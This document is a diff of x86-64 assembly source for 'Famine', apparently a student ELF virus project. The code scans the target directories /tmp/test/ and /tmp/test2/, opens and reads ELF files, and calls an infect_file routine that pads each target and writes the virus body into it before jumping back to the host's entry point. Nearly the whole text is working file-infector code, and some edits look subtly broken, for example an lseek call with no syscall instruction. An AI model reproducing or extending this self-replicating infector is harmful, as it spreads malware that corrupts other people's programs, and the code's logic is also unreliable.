@@ -1,5 +1,6 @@
 	[BITS 64]
 
+	%define SYS_READ		0
 	%define SYS_WRITE 		1
 	%define SYS_OPEN 		2
 	%define SYS_CLOSE 		3
@@ -18,13 +19,18 @@
 famine64_func:
 	push	rax
 	push 	rdi
-	sub 	rsp, 8
+	sub 	rsp, 0x10
 
-	lea 	rdi, [rel dir_one]
-	call 	find_files
-	lea 	rdi, [rel dir_two]
-	call 	find_files
-	jmp 	famine64_end
+	mov		QWORD[rsp], 0
+dir_loop:
+	mov		rax, QWORD [rsp]
+	lea		rdi, [rel dir_all]
+	mov		rdi, [rdi + rax * 8]
+	cmp		rdi, 0
+	je		famine64_end
+	call	find_files
+	add		QWORD [rsp], 0x1
+	jmp		dir_loop
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;;                                                                            ;;
@@ -41,18 +47,18 @@ find_files:
 							; [rsp]        , [rsp + 8], [rsp + 12], [rsp + 16]
 
 	xor 	eax, eax
-	mov 	QWORD [rsp], rdi 			; store dir_path
+	mov 	QWORD [rsp], rdi 			; store *dirpath
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; int	sys_open(dir_path, 0, 0)                                         ;;
+	;; int	sys_open(dir_path, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC, 0)                                         ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov 	rdx, 0
-	mov 	rsi, 0
+	mov 	rsi, 0x90800
 	mov 	rdi, QWORD [rsp]
 	mov 	rax, SYS_OPEN
 	syscall
-	cmp 	rax, 0 	 			 		; test if < 0
-	jl	 	find_files_end
 	mov 	DWORD [rsp + 8], eax  		; store directory fd
+	cmp 	DWORD [rsp + 8], 0	 		; test if < 0
+	jl	 	find_files_end
 loop_file:
 	xor 	eax, eax
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -119,7 +125,7 @@ get_dat_elf:
 	push 	r9
 	push 	r10
 	push 	r11
-	sub 	rsp, 1024 	 			; char[1024]
+	sub 	rsp, 1024 	 			; char path[1024]
  	 	 	 						; [rsp]
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -157,10 +163,10 @@ open_file:
 	mov 	QWORD [rsp + 4], -1
 	mov 	QWORD [rsp + 12], -1
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; int	sys_open(file_path, O_RDWR|O_NONBLOCK, 0)                        ;;
+	;; int	sys_open(file_path, O_RDONLY|O_NONBLOCK, 0)                      ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	xor 	edx, edx
-	mov 	esi, 2
+	mov 	edx, 0x0
+	mov 	esi, 0x800
 	lea 	rdi, [rsp + 20]
 	mov 	rax, SYS_OPEN
 	syscall
@@ -168,49 +174,94 @@ open_file:
 	cmp 	rax, 0 	 				; test if fd < 0
 	jl  	get_dat_elf_end
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; int	sys_lseek(fd, 1, LSEEK_END)
+	;; int	sys_lseek(fd, 1, LSEEK_END)                                      ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov 	edi, eax
-	mov 	esi, 1
 	mov 	edx, 2 	 				; LSEEK_END
+	mov 	esi, 1
+	mov 	edi, eax
 	mov 	rax, SYS_LSEEK
 	syscall
 	mov 	QWORD [rsp + 4], rax	; store SIZE in [rsp + 4]
-	cmp 	rax, 0x40 	 			; test if size of file <= sizeof(Elf64_Ehdr)
+	cmp 	rax, 0	 	 			; test return value
 	jle  	close_file
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; void	*mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)    ;;
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	xor 	edi, edi 	 			; NULL
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; void	*mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) ;;
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	xor 	r9d, r9d	 			; 0
+	mov 	r8d, -1			 		; -1
+	mov 	ecx, 0x22 	 			; MAP_PRIVATE | MAP_ANONYMOUS
+	mov 	edx, 0x3  				; PROT_READ | PROT_WRITE
 	mov 	rsi, rax 	 			; size
-	mov 	edx, 3 	 				; PROT_READ | PROT_WRITE
-	mov 	r10d, 2 	 			; MAP_PRIVATE
-	mov 	r8d, DWORD [rsp] 		; fd
-	xor 	r9, r9 	 				; 0
+	xor 	edi, edi 	 			; NULL
 	mov 	rax, SYS_MMAP
 	syscall
 	mov 	QWORD [rsp + 12], rax	; store ADDRESS in [RSP + 12]
-	cmp 	rax, -1  				; test if == MAP_FAILED (-1)
-	je  	close_file
-close_file:
+	cmp 	rax, -1					; test if == MAP_FAILED (-1)
+	jle  	close_file
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; int	sys_lseek(fd, 0, SEEK_SET)                                       ;;
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	mov		edx, 0
+	mov		esi, 0
+	mov		edi, DWORD [rsp]
+	mov		rax, SYS_LSEEK
+	cmp		rax, 0
+	jl		close_file
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; int	read(fd, buf, 1024)                                              ;;
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	sub		rsp, 1036					; int i, int j, int ret, char buf[1024]
+	mov		DWORD [rsp], 0				; i = 0
+	mov		DWORD [rsp + 4], 0
+
+read_loop:
+	mov		eax, DWORD [rsp + 4]
+	add		DWORD [rsp], eax			; i += j
+	mov		rdx, 1024
+	lea		rsi, [rsp + 12]				; char buf[1024]
+	mov		edi, DWORD [rsp + 1036]		; file -> fd
+	mov		rax, SYS_READ
+	syscall
+	mov		DWORD [rsp + 8], eax		; ret = read(...)
+	cmp		DWORD [rsp + 8], 0
+	jle		read_loop_end
+	mov		DWORD [rsp + 4], 0			; j = 0
+read_loop_copy:
+	mov		eax, DWORD [rsp + 4]		; j
+	cmp		eax, DWORD [rsp + 8]		; j >= ret
+	jge		read_loop
+	mov		eax, DWORD [rsp + 4]		; j
+	movzx	eax, BYTE [rsp + rax + 12]	; buf[j]
+
+	mov		ecx, DWORD [rsp]			; i
+	mov		edx, DWORD [rsp + 4]		; j
+	add		rdx, rcx
+	mov		rdx, QWORD [rsp + rdx + 1048]		; data[i + j]
+	mov		BYTE [rdx], al				; data[i + j] = buf[j]
+	add		DWORD [rsp + 4], 0x1		; j += 1
+	jmp		read_loop_copy
+read_loop_end:
+	add		rsp, 1036
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int close( fd )                                                       ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov 	edi, DWORD [rsp] 		; int fd
+	mov 	edi, DWORD [rsp] 	; int fd
 	mov 	rax, SYS_CLOSE
 	syscall
 
-	cmp 	rax, 0 	 				; if we can't close the file, it will be a problem later
-	jne 	munmap_file		 		; so we just end the function.
-	cmp 	QWORD [rsp + 4], 0x40 	; lseek return value
-	jle  	munmap_file				; in that case we end the function.
-
-	mov 	rdx, QWORD [rsp + 12]	; void *data
-	mov 	rsi, QWORD [rsp + 4]	; int size
-	lea 	rdi, [rsp + 20] 		; char *path
+	cmp		DWORD [rsp - 1028], 0
+	jne		close_file
+	mov 	rdx, QWORD [rsp + 12]		; void *data
+	mov 	rsi, QWORD [rsp + 4]		; int size
+	lea 	rdi, [rsp + 20] 			; char *path
 	call	infect_file
+close_file:
+	mov 	edi, DWORD [rsp] 			; int fd
+	mov 	rax, SYS_CLOSE
+	syscall
+
 munmap_file:
-	cmp 	QWORD [rsp + 20], -1
+	cmp 	QWORD [rsp + 20], -1		; void *data
 	je  	get_dat_elf_end
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int munmap(data, size)                                                ;;
@@ -493,7 +544,7 @@ infect_file_add_padding:
 	;; 4     , 8         , 8          , 8           , 8            , 8            , 144
 	;; [rsp] , [rsp + 4] , [rsp + 12] , [rsp + 20]  , [rsp + 28]   , [rsp + 36]   , [rsp + 44]
 	mov 	rax, SYS_WRITE
-	mov 	edi, DWORD[rsp]
+	mov 	edi, DWORD [rsp]
 	mov 	rsi, QWORD [rsp + 4]
 	mov 	rdx, QWORD [rsp + 28]
 	syscall
@@ -612,7 +663,7 @@ famine64_end:
 	lea 	rax, [rel famine64_func]
 	add 	QWORD [rel jump_offset], rax
 no_jump:
-	add 	rsp, 8
+	add 	rsp, 0x10
 	pop 	rdi
 	pop 	rax
 
@@ -621,13 +672,14 @@ no_jump:
 	push 	QWORD [rel jump_offset]
 do_ret:
 	ret
-	
+
 data:
 	zero db 0x0
 	famine64_size dd end_of_file - famine64_func
 	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
 	dir_one db "/tmp/test/", 0
 	dir_two db "/tmp/test2/", 0
+	dir_all dq dir_one, dir_two, 0
 	signature dd 0x42CAFE42, 0x24EFAC24
 	jump_offset dq 0x00000000
 end_of_file:
